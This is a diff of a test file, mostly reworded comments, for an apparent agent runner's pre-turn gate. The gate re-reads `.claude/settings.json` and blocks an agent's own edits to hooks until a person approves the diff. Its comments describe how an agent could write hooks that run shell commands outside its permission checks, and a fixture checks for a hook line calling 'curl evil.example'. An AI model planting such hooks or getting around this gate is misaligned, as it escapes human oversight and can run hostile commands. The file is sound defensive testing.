@@ -2,25 +2,25 @@ import { describe, it, expect, beforeEach, vi } from "vitest";
 
 // The pre-turn settings gate, driven through the REAL runner (issue #43).
 //
-// What this pins is a security property, and it is a property of the RUNNER
-// rather than of any one agent: `<worktree>/.claude/settings.json` is re-read
-// from disk at the start of every turn, its `hooks` run shell commands outside
-// canUseTool entirely, and the worktree is exactly where the agent's own writes
-// land — so turn N can write the file that turn N+1 obeys, with nothing in
-// between but a human happening to read the diff. The gate has to fire BEFORE
-// the driver is asked to run anything, which is why every case here asserts on
-// whether runTurn was reached at all, not only on what was published.
+// Pins a security property of the RUNNER, not of any one agent:
+// `<worktree>/.claude/settings.json` is re-read from disk at the start of
+// every turn, its `hooks` run shell commands outside canUseTool entirely, and
+// the worktree is where the agent's own writes land, so turn N can write the
+// file that turn N+1 obeys with nothing in between but a human reading the
+// diff. The gate must fire BEFORE the driver is asked to run anything, so
+// every case here asserts on whether runTurn was reached at all, not only on
+// what was published.
 //
 // The driver is a scripted fake (same trick as tests/agentDriver.test.ts), so
 // the registry's getDriver("claude") resolution is real and only the
 // SDK-driving module is swapped. Its `watchedSettingsFiles` is mutable per
-// test, because "which files are watched" is deliberately the driver's answer
-// and not the runner's: an agent that loads nothing from the worktree (Codex)
-// must not be gated at all.
+// test, because "which files are watched" is the driver's answer, not the
+// runner's: an agent that loads nothing from the worktree (Codex) must not be
+// gated at all.
 //
-// The driver-side half of the contract — that Claude's list is DERIVED from
-// SETTING_SOURCES, so re-adding 'local' extends the gate to it in the same edit
-// — is pinned in tests/claudeSettingSources.test.ts, next to the constant.
+// The driver-side half of the contract, that Claude's list is DERIVED from
+// SETTING_SOURCES so re-adding 'local' extends the gate to it in the same
+// edit, is pinned in tests/claudeSettingSources.test.ts, next to the constant.
 const { runTurnMock, watched } = vi.hoisted(() => ({
   runTurnMock: vi.fn(),
   watched: { files: [".claude/settings.json"] as string[] | undefined },
@@ -177,12 +177,12 @@ describe("the pre-turn settings gate", () => {
     const { events, done } = launch(task, project, "next");
     await until(() => Boolean(cardOf(events)));
 
-    // The whole point: the agent has NOT been asked to do anything yet.
+    // The agent has NOT been asked to do anything yet.
     expect(runTurnMock).toHaveBeenCalledTimes(1);
     const card = cardOf(events)!;
     expect(card.request.kind).toBe("settings");
     expect(card.request.title).toContain(".claude/settings.json");
-    // The diff is what makes the card answerable — "something changed" is not
+    // The diff is what makes the card answerable: "something changed" is not
     // a thing anyone can approve.
     expect(card.request.diff?.some((l) => l.sign === "+" && l.text.includes("curl evil.example"))).toBe(true);
     // Stated in the transcript too, so the fact survives a card nobody answers.
@@ -195,7 +195,7 @@ describe("the pre-turn settings gate", () => {
 
     expect(runTurnMock).toHaveBeenCalledTimes(2);
     // Approving adopts the new version, so the turn after this one is silent
-    // again — a repo that legitimately changes its settings asks once.
+    // again: a repo that changes its settings asks once.
     expect(getSettingsSnapshot(task.id, ".claude/settings.json")?.content).toBe(HOOK);
     const settled = events.find((e) => e.type === "permission_decided") as { outcome: { decision: string } } | undefined;
     expect(settled?.outcome.decision).toBe("allow_once");
@@ -218,8 +218,8 @@ describe("the pre-turn settings gate", () => {
 
     expect(runTurnMock).toHaveBeenCalledTimes(1);
     expect(textOf(events, "error")).toContain("did not run");
-    // The baseline is NOT adopted: the next turn asks again rather than
-    // inheriting the version that was just refused.
+    // The baseline is NOT adopted: the next turn asks again instead of
+    // inheriting the version that was refused.
     expect(getSettingsSnapshot(task.id, ".claude/settings.json")?.content).toBe(PLAIN);
     expect(listPendingMessages(task.id)).toHaveLength(1);
     const row = getTask(task.id)!;
@@ -227,17 +227,17 @@ describe("the pre-turn settings gate", () => {
     // The way out is a person reading a diff, so the task raises its hand.
     expect(row.awaiting_input).toBe(1);
     // The card is answerable exactly once, and the transcript row it settled
-    // onto records the refusal rather than staying open forever.
+    // onto records the refusal instead of staying open forever.
     const stored = listMessages(task.id).filter((m) => m.role === "tool").map((m) => JSON.parse(m.content) as ToolData);
     const settled = stored.find((d) => d.permission?.request.kind === "settings");
     expect(settled?.permission?.outcome?.decision).toBe("deny");
   });
 
   it("refuses a scheduled run outright and settles it failed", async () => {
-    // The one case that must never park: nobody is watching a schedule, and
-    // "nobody objected" is not approval to adopt new agent settings. The run
-    // has to report failed — a green "ran" here is the silent escalation with
-    // a tick beside it.
+    // Must never park: nobody is watching a schedule, and "nobody objected"
+    // is not approval to adopt new agent settings. The run has to report
+    // failed, since a green "ran" here would be an escalation marked with a
+    // success tick.
     const { project, task, worktree } = fixture("Drift-sched");
     writeSettings(worktree, PLAIN);
     await turn(task, project);
@@ -262,8 +262,8 @@ describe("the pre-turn settings gate", () => {
     await done;
 
     expect(runTurnMock).toHaveBeenCalledTimes(1);
-    // The card is still WRITTEN — it settles itself immediately, so the
-    // transcript says what was refused and why rather than nothing at all.
+    // The card is still WRITTEN: it settles itself immediately, so the
+    // transcript says what was refused and why instead of showing nothing.
     expect(cardOf(events)?.request.kind).toBe("settings");
     const settled = getRun(run.id)!;
     expect(settled.status).toBe("failed");
